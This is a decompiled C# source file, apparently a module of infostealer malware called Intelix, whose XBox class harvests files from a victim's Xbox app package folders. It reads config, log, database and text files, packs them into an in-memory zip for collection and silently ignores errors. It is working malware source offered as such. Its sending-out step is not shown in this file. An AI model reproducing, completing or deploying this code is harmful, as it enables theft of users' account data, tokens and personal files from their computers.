using System;
using System.IO;
using System.Linq;
using Intelix.Helper.Data;

namespace Intelix.Targets.Games
{
	// Token: 0x0200002C RID: 44
	public class XBox : ITarget
	{
		// Token: 0x0600007B RID: 123 RVA: 0x000060D4 File Offset: 0x000042D4
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Packages");
			bool flag = !Directory.Exists(path);
			if (!flag)
			{
				string[] directories = Directory.GetDirectories(path, "Microsoft.Xbox*", SearchOption.TopDirectoryOnly);
				bool flag2 = directories == null || directories.Length == 0;
				if (!flag2)
				{
					string[] source = new string[]
					{
						".ini",
						".cfg",
						".json",
						".xml",
						".log",
						".dat",
						".db",
						".yaml",
						".txt"
					};
					string[] array = directories;
					foreach (string text in array)
					{
						Counter.CounterApplications counterApplications = new Counter.CounterApplications();
						counterApplications.Name = "Xbox";
						string[] files = Directory.GetFiles(text, "*.*", SearchOption.AllDirectories);
						foreach (string text2 in files)
						{
							try
							{
								FileInfo fileInfo = new FileInfo(text2);
								bool flag3 = fileInfo.Length < 10000000L && source.Contains(fileInfo.Extension.ToLower());
								if (flag3)
								{
									string path2 = text2.Substring(text.Length).TrimStart(new char[]
									{
										Path.DirectorySeparatorChar,
										Path.AltDirectorySeparatorChar
									});
									string text3 = Path.Combine("Xbox", Path.GetFileName(text), path2).Replace('\\', '/');
									zip.AddFile(text3, File.ReadAllBytes(fileInfo.FullName));
									counterApplications.Files.Add(fileInfo.FullName + " => " + text3);
								}
							}
							catch
							{
							}
						}
						bool flag4 = counterApplications.Files.Count > 0;
						if (flag4)
						{
							counterApplications.Files.Add("Xbox\\");
							counter.Games.Add(counterApplications);
						}
					}
				}
			}
		}
	}
}
